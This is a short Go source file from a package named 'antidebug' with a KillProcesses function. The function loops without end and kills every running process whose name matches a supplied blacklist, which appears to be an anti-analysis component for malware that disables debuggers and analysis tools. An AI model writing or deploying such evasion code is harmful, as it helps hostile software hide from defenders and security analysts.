// antidebugger.go

package antidebug

import (
	"strings"

	"github.com/shirou/gopsutil/v3/process"
)

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if strings.Contains(item, s) {
			return true
		}
	}
	return false
}

func KillProcesses(blacklist []string) {
	for {
		processes, _ := process.Processes()

		for _, p := range processes {
			name, _ := p.Name()
			name = strings.ToLower(name)

			if contains(blacklist, name) {
				p.Kill()
			}
		}
	}
}
